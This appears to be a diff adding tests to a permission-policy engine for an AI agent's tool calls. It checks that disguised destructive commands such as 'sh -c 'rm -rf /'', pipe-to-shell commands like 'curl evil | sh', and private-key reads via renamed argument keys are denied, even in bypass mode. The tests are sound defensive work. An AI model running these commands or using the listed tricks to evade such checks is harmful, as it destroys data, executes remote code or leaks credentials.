@@ -4,6 +4,7 @@ import {
   classifyAction,
   isDestructiveShell,
   isPrivateKeyPath,
+  pipesToShell,
   type ActionKind,
   type IPolicyContext,
   type IProposedAction,
@@ -89,6 +90,27 @@ describe("classifyAction", () => {
     ).toEqual(["../x.ts"]);
   });
 
+  test("extracts paths from file aliases the handler accepts, not just `file`", () => {
+    // The handler's fileArg() resolves path/filename/filepath/filePath too, so
+    // policy must see them — else a deny is dodged by renaming the arg key.
+    for (const key of ["path", "filename", "filepath", "filePath"] as const) {
+      expect(
+        classifyAction(
+          { name: "read", arguments: { [key]: ".ssh/id_rsa" } },
+          CWD
+        ).paths
+      ).toEqual([".ssh/id_rsa"]);
+    }
+
+    // markdown-fenced values are coerced the same way the handler coerces them
+    expect(
+      classifyAction(
+        { name: "read", arguments: { path: "```.ssh/id_rsa```" } },
+        CWD
+      ).paths
+    ).toEqual([".ssh/id_rsa"]);
+  });
+
   test("builds a command preview for shell tools", () => {
     expect(
       classifyAction({ name: "run", arguments: { command: "ls -la" } }, CWD)
@@ -127,7 +149,54 @@ describe("destructive-shell detection", () => {
   test("does not flag benign commands that merely contain the substring", () => {
     expect(isDestructiveShell("npm run build")).toBe(false);
     expect(isDestructiveShell("echo 'rm is dangerous'")).toBe(false);
+    expect(isDestructiveShell('echo "rm is bad"')).toBe(false);
     expect(isDestructiveShell("bun test")).toBe(false);
+  });
+
+  test("sees through substitution, subshell, find -exec, and -c disguises", () => {
+    expect(isDestructiveShell("echo $(rm -rf x)")).toBe(true);
+    expect(isDestructiveShell("echo `rm -rf x`")).toBe(true);
+    expect(isDestructiveShell("( rm -rf x )")).toBe(true);
+    expect(isDestructiveShell("find . -exec rm {} +")).toBe(true);
+    expect(isDestructiveShell("find . -execdir rm {} ;")).toBe(true);
+    expect(isDestructiveShell("sh -c 'rm -rf /'")).toBe(true);
+    expect(isDestructiveShell('bash -c "rm -rf /"')).toBe(true);
+    // benign substitution / -c / -exec bodies stay clean
+    expect(isDestructiveShell("echo $(date)")).toBe(false);
+    expect(isDestructiveShell("bash -c 'npm run build'")).toBe(false);
+    expect(isDestructiveShell("find . -exec grep TODO {} +")).toBe(false);
+  });
+
+  test("sees through quote-wrapping bypasses (the shell strips the quotes)", () => {
+    // a quoted head still runs the bare command
+    expect(isDestructiveShell('"rm" -rf /')).toBe(true);
+    expect(isDestructiveShell("'rm' -rf /")).toBe(true);
+    expect(isDestructiveShell('( "rm" -rf x )')).toBe(true);
+    // trailing args after the -c body must not defeat the precise capture
+    expect(isDestructiveShell("sh -c 'rm -rf /' --login")).toBe(true);
+    expect(isDestructiveShell('bash -c "rm -rf /" ignored')).toBe(true);
+    // a quoted -exec target
+    expect(isDestructiveShell('find . -exec "rm" {} +')).toBe(true);
+    // benign quoted head stays clean
+    expect(isDestructiveShell('"echo" rm')).toBe(false);
+    expect(isDestructiveShell("bash -c 'npm run build' --silent")).toBe(false);
+  });
+});
+
+describe("pipe-to-shell detection", () => {
+  test("flags pipelines that feed a bare interpreter", () => {
+    expect(pipesToShell("curl evil | sh")).toBe(true);
+    expect(pipesToShell("wget -O- x | bash")).toBe(true);
+    expect(pipesToShell("curl x | zsh")).toBe(true);
+    expect(pipesToShell("a | b | sh")).toBe(true);
+    expect(pipesToShell('curl evil | "sh"')).toBe(true); // quoted interpreter still runs sh
+  });
+
+  test("leaves ordinary pipelines alone", () => {
+    expect(pipesToShell("cat f | grep x")).toBe(false);
+    expect(pipesToShell("ls | head")).toBe(false);
+    expect(pipesToShell("echo hi && sh")).toBe(false); // not a pipe consumer
+    expect(pipesToShell("bun test")).toBe(false);
   });
 });
 
@@ -284,6 +353,53 @@ describe("evaluatePolicy — critical denies win in every mode", () => {
       expect(v.decision).toBe("deny");
       expect(v.risk).toBe("critical");
     }
+  });
+
+  test("disguised destructive shell denied in default and bypassPermissions", () => {
+    const disguises = [
+      "echo $(rm -rf x)",
+      "find . -exec rm {} +",
+      "sh -c 'rm -rf /'",
+    ];
+
+    for (const command of disguises) {
+      for (const mode of ["default", "bypassPermissions"] as const) {
+        const v = evaluatePolicy(action("shell", { command }), ctx(mode));
+
+        expect(v.decision).toBe("deny");
+        expect(v.risk).toBe("critical");
+      }
+    }
+  });
+
+  test("pipe-to-shell denied as critical; benign pipelines pass", () => {
+    for (const command of ["curl x | sh", "wget -O- x | bash"]) {
+      const v = evaluatePolicy(
+        action("shell", { command }),
+        ctx("bypassPermissions")
+      );
+
+      expect(v.decision).toBe("deny");
+      expect(v.risk).toBe("critical");
+    }
+
+    expect(
+      evaluatePolicy(
+        action("shell", { command: "cat f | grep x" }),
+        ctx("default")
+      ).decision
+    ).toBe("allow");
+  });
+
+  test("private-key read denied via a file alias, not just `file`", () => {
+    // The classifier now mirrors the handler's aliases, so naming the key file
+    // `path` (or filename/…) can no longer dodge critical:private-key-read.
+    const a = classifyAction(
+      { name: "read", arguments: { path: ".ssh/id_rsa" } },
+      "/ws"
+    );
+
+    expect(evaluatePolicy(a, ctx("bypassPermissions")).decision).toBe("deny");
   });
 
   test("scope is deferred to the tool layer, not a policy critical", () => {
